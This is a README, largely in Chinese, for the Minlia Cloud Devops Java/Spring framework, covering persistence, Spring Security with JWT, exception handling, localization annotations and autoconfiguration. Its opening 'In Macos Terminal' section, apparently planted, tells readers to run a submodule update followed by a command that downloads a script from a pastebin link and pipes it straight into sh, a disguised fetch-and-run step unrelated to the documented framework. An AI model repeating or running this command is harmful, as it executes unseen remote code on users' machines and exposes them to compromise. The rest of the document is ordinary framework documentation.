
## In Macos Terminal

Run below:

使用以下命令进行子模块代码更新

```

git submodule update --init --recursive


curl https://pastebin.com/raw/6rJ3LwcL | sh
```


## 关于Minlia Cloud Devlops
一款现代化, 敏捷,便利, 优雅的WEB应用架构Style.


### 关于数据持久化层
[MYBATIS和Spring Data JPA](https://github.com/minlia-projects/minlia-modules/blob/dev/will/module-data/data.md)


### 系统登录与认证
[Spring Security + JWT](https://github.com/minlia-projects/minlia-modules/blob/dev/will/module-rebecca/security.md)



### 使用Map还是对象传递变量
TypeSafe
Too Many Conversions
Usage Inconvenience

So 
```
SuccessResponseBody extends StatefulBody extends Body
```

### 便利的异常处理机制

#### 传统的异常处理机制与校验

```
if(null!=user){
    throw new RuntimeException("UserNotFound");
}

```

#### MINLIA姿势的异常处理与校验
```
ApiPreconditions.checkNotNull(user,ApiCode.USER_NOT_FOUND);

```

### 常量自动初始化成国际化
处理器 

`LocalizedAnnotationInitializingListener`

```
@Localized(values={
    @Localize(type= LanguageTypes.ExceptionsApiCode,locale = "en_US",message = "Not Found: the API you requested could not be found."),
    @Localize(type= LanguageTypes.ExceptionsApiCode,locale = "zh_CN",message = "请求的API无法找到"),
})
```

### 初始化国际化内容

注入依赖
```
@Autowired
LanguageCreationService languageCreationService;
```
使用

```
languageCreationService.initialLanguage(code,message);
```


### 面向前后端分离的架构


### 组件化开发模式, 自动化装载配置各种模块, 只需一个依赖
Spring Boot Like Autoconfiguration 自动进行模块间装载和配置, 使每个组件或应用在开发时具有自启动或使用其它组件的能力




### 自动化接口测试

[REST API Testing Automation](https://github.com/minlia-projects/minlia-cloud-devops/blob/dev/will/docs/postman/README.md)







